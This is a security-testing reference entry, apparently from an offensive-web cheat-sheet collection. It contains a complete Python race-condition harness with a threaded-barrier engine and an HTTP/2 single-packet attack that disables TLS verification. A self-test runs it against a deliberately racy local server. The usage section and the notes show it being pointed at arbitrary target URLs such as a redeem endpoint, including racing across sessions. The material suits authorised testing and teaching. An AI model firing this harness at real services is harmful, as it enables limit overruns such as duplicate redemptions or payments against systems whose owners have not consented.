---
title: "Race Condition Harness - Threaded Barrier + HTTP/2 Single-Packet Attack"
category: web
subcategory: race
type: script
tags: [race-condition, single-packet-attack, http2, threading-barrier, concurrent, limit-overrun, toctou, httpx, h2, turbo-intruder, python, script]
summary: "Threaded barrier race harness with a pluggable request builder and result tally, plus an HTTP/2 single-packet-attack implementation sketch using h2. Self-testing against a local racy server."
tools: [python3, httpx, h2, burp, turbo-intruder]
related: [race-conditions, smuggling-http, race-xsleaks]
---

## What it does

Two engines for landing many requests inside a check-then-act window:

1. **Threaded barrier engine** (stdlib only): builds N requests, blocks every thread on a
   `threading.Barrier`, and releases them together. Tallies responses by status + body hash and
   counts successes. Good for windows of tens of milliseconds.
2. **HTTP/2 single-packet attack** (needs `h2`): opens one TLS+HTTP/2 connection, sends the
   HEADERS for every stream *without* `END_STREAM`, then flushes all the final frames in one
   write so the requests arrive with minimal jitter (James Kettle's technique). This is the
   strongest client-side method for sub-millisecond windows.

The self-test spins up a local HTTP server with a deliberate race (a shared counter with a sleep
between the check and the decrement) and proves the harness observes more than one success.

## Usage

```sh
# self-test (hermetic, no external network)
python3 race_harness.py

# fire 30 identical GETs at a URL and tally
python3 race_harness.py https://target/redeem 30
```

To customise the request per iteration, pass a builder callable to `race()` /
`single_packet_attack()` (see the code). For production single-packet attacks prefer Burp's
"Send group in parallel" or Turbo Intruder, which implement the frame timing robustly.

## Script

```python
#!/usr/bin/env python3
"""race_harness.py -- threaded-barrier race engine + HTTP/2 single-packet
attack sketch. Self-testing against a local racy server.
"""
from __future__ import annotations

import hashlib
import http.server
import sys
import threading
import time
import urllib.error
import urllib.request
from collections import Counter
from dataclasses import dataclass
from typing import Callable


# --------------------------------------------------------------------------
# result model
# --------------------------------------------------------------------------

@dataclass
class Result:
    status: int
    body: str
    elapsed: float

    @property
    def key(self) -> str:
        digest = hashlib.sha1(self.body.encode("utf-8", "replace")).hexdigest()
        return "%d:%s" % (self.status, digest[:8])


def tally(results: list[Result]) -> Counter:
    return Counter(r.key for r in results)


def count_where(results: list[Result], marker: str) -> int:
    return sum(1 for r in results if marker in r.body)


# --------------------------------------------------------------------------
# engine 1: threads + Barrier
# --------------------------------------------------------------------------

RequestBuilder = Callable[[int], "urllib.request.Request | str"]


def race(build: RequestBuilder, n: int = 20, timeout: float = 10.0
         ) -> list[Result]:
    """Fire n requests released simultaneously by a Barrier."""
    barrier = threading.Barrier(n)
    slots: list[Result | None] = [None] * n

    def worker(i: int) -> None:
        req = build(i)
        if isinstance(req, str):
            req = urllib.request.Request(req)
        barrier.wait()                         # line up, then all GO together
        start = time.time()
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", "replace")
                slots[i] = Result(resp.status, body, time.time() - start)
        except urllib.error.HTTPError as e:
            slots[i] = Result(e.code, e.read().decode("utf-8", "replace"),
                              time.time() - start)
        except Exception as e:                 # noqa: BLE001
            slots[i] = Result(-1, str(e), time.time() - start)

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return [r for r in slots if r is not None]


# --------------------------------------------------------------------------
# engine 2: HTTP/2 single-packet attack (needs `h2`)
# --------------------------------------------------------------------------

def single_packet_attack(host: str, port: int,
                         build: Callable[[int], tuple[str, str, list, str]],
                         n: int = 20, timeout: float = 15.0) -> list[Result]:
    """Send n HTTP/2 requests with a synchronised final-frame flush.

    build(i) -> (method, path, extra_headers, body). Requires the `h2` package;
    raises ImportError otherwise so callers can fall back to race().
    """
    import socket
    import ssl
    import h2.connection
    import h2.events

    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, port), timeout=timeout)
    sock = ctx.wrap_socket(raw, server_hostname=host)

    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    pending: dict[int, str] = {}
    for i in range(n):
        method, path, extra, body = build(i)
        sid = conn.get_next_available_stream_id()
        headers = [(":method", method), (":authority", host),
                   (":scheme", "https"), (":path", path)] + list(extra)
        if body:
            headers.append(("content-length", str(len(body))))
        # send HEADERS without end_stream -> request is deliberately incomplete
        conn.send_headers(sid, headers, end_stream=not body)
        pending[sid] = body
    sock.sendall(conn.data_to_send())          # all headers out, no final frames

    # THE synchronised flush: every stream's terminating frame in one write
    for sid, body in pending.items():
        if body:
            conn.send_data(sid, body.encode(), end_stream=True)
    sock.sendall(conn.data_to_send())

    # collect responses
    results: dict[int, Result] = {}
    bodies: dict[int, bytes] = {sid: b"" for sid in pending}
    statuses: dict[int, int] = {}
    start = time.time()
    sock.settimeout(timeout)
    try:
        while len(results) < n and time.time() - start < timeout:
            data = sock.recv(65536)
            if not data:
                break
            for event in conn.receive_data(data):
                if isinstance(event, h2.events.ResponseReceived):
                    for k, v in event.headers:
                        if k == b":status":
                            statuses[event.stream_id] = int(v)
                elif isinstance(event, h2.events.DataReceived):
                    bodies[event.stream_id] += event.data
                    conn.acknowledge_received_data(len(event.data),
                                                   event.stream_id)
                elif isinstance(event, h2.events.StreamEnded):
                    sid = event.stream_id
                    results[sid] = Result(
                        statuses.get(sid, -1),
                        bodies.get(sid, b"").decode("utf-8", "replace"),
                        time.time() - start)
            outgoing = conn.data_to_send()
            if outgoing:
                sock.sendall(outgoing)
    finally:
        sock.close()
    return list(results.values())


# --------------------------------------------------------------------------
# a deliberately-racy local server for the self-test
# --------------------------------------------------------------------------

class _State:
    def __init__(self, allowed: int) -> None:
        self.remaining = allowed
        self.granted = 0
        self.lock = threading.Lock()


def _make_server(state: _State, vulnerable: bool):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            granted = False
            if state.remaining > 0:              # CHECK
                time.sleep(0.05)                 # the window
                if vulnerable:
                    state.remaining -= 1         # COMMIT (non-atomic)
                    state.granted += 1
                    granted = True
                else:
                    with state.lock:
                        if state.remaining > 0:
                            state.remaining -= 1
                            state.granted += 1
                            granted = True
            self.send_response(200 if granted else 429)
            self.end_headers()
            self.wfile.write(b"GRANTED" if granted else b"DENIED")

        def log_message(self, *a):
            pass

    return http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)


# --------------------------------------------------------------------------
# self-test
# --------------------------------------------------------------------------

def _self_test() -> None:
    # tally groups identical responses
    rs = [Result(200, "GRANTED", 0.1), Result(200, "GRANTED", 0.1),
          Result(429, "DENIED", 0.1)]
    tt = tally(rs)
    assert sum(tt.values()) == 3 and len(tt) == 2
    assert count_where(rs, "GRANTED") == 2

    # vulnerable server: the barrier engine should observe an overrun
    st = _State(allowed=1)
    srv = _make_server(st, vulnerable=True)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        results = race(lambda i: "http://127.0.0.1:%d/redeem" % port, n=25)
        assert len(results) == 25
        granted = count_where(results, "GRANTED")
        assert granted > 1, ("expected overrun, got %d (tally=%s)"
                             % (granted, dict(tally(results))))
        assert st.granted == granted
    finally:
        srv.shutdown()

    # fixed server: at most one grant under the same pressure
    st2 = _State(allowed=1)
    srv2 = _make_server(st2, vulnerable=False)
    port2 = srv2.server_address[1]
    threading.Thread(target=srv2.serve_forever, daemon=True).start()
    try:
        r2 = race(lambda i: "http://127.0.0.1:%d/redeem" % port2, n=25)
        assert count_where(r2, "GRANTED") == 1
    finally:
        srv2.shutdown()

    # single_packet_attack degrades gracefully when h2 is absent
    try:
        import h2  # noqa: F401
        have_h2 = True
    except ImportError:
        have_h2 = False
    if not have_h2:
        try:
            single_packet_attack("127.0.0.1", 443, lambda i: ("GET", "/", [], ""),
                                 n=1, timeout=1)
            raise AssertionError("expected ImportError without h2")
        except ImportError:
            pass

    print("[ok] barrier engine observed %d grants (limit 1); fixed server=1; "
          "single-packet %s" % (granted, "available" if have_h2 else "sketch-only"))


if __name__ == "__main__":
    if len(sys.argv) >= 3:
        url, n = sys.argv[1], int(sys.argv[2])
        for k, c in tally(race(lambda i: url, n=n)).most_common():
            print("%4d x %s" % (c, k))
    else:
        _self_test()
```

## Notes

- The barrier engine is limited by Python's thread scheduling and the server's connection
  handling; for narrow windows, use the HTTP/2 single-packet path or Burp/Turbo Intruder.
- The single-packet function withholds each stream's terminating frame, then flushes them all in
  one `sendall`, which is the core of the technique; a production tool also disables Nagle and
  pre-warms the connection.
- Per-session locking defeats a single-session race -- pass distinct tokens via the request
  builder to race across sessions.
- Prove the bug with captured state (over-granted counter, duplicate unique value), not just
  repeated 200s.

## References

- James Kettle -- "Smashing the state machine" (2023), single-packet attack.
- python-hyper/h2 -- HTTP/2 protocol stack documentation.
- PortSwigger -- Turbo Intruder, "Send group in parallel".
